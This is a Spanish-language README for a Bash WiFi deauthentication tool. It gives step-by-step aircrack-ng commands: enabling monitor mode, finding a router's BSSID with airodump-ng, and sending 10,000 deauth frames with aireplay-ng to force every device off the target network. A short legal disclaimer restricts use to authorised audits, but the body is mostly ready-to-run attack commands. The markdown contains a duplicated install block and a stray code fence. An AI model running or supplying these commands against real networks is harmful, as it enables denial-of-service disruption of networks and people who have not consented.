# 🔓 WiFi Deauthentication Script

Este script en Bash permite realizar un ataque de **deautenticación WiFi**, forzando la desconexión de todos los dispositivos conectados a un router específico. Es útil para pruebas de **auditoría de seguridad** en redes propias.

> ⚠️ **Advertencia Legal**  
> Este script está destinado exclusivamente a fines educativos y de auditoría en redes autorizadas.  
> El uso no autorizado de esta herramienta puede violar leyes locales o internacionales.  
> El autor no se responsabiliza por el uso indebido.

---

## 🛠 Requisitos

- 🐧 **Distribución Linux** con soporte de herramientas de auditoría (Kali Linux, Parrot OS, etc.).
- 📡 **Adaptador WiFi** compatible con **modo monitor** e **inyección de paquetes**.
- 🔧 **Paquete `aircrack-ng`** instalado (incluye `airmon-ng`, `aireplay-ng`, etc.).

### 1. Instalación de `aircrack-ng` (si aún no lo tienes):

```bash
sudo apt update && sudo apt install aircrack-ng
```

```bash
sudo apt update && sudo apt install aircrack-ng
```
### 2. Da permisos de ejecución al script
```bash
chmod +x deauth.sh
3. Ejecuta el script como superusuario "sudo"
```

```bash
sudo ./deauth.sh
```

### 4. Selecciona la interfaz WiFi
El script mostrará tus interfaces disponibles. Por ejemplo:

```
wlan0 
wlan1

Introduce el nombre de la interfaz que deseas usar.
```

### 5. Activa el modo monitor
Si aún no lo has hecho manualmente, actívalo así:

```bash
sudo airmon-ng start wlan0
```

### 6. Introduce el BSSID del router objetivo
El script te pedirá que ingreses el BSSID (ejemplo: 
```
54:65:DE:8D:8F:10).
```
Puedes obtenerlo usando:

```bash
sudo airodump-ng wlan0mon
```

### 7. El script lanzará el ataque
Verás un mensaje indicando que se ha iniciado el ataque con:

```
bash
sudo aireplay-ng --deauth 10000 -a [BSSID] [interfaz]
```

### 8. Para detener el modo monitor (opcional)
```bash
sudo airmon-ng stop wlan0mon
sudo service NetworkManager restart
```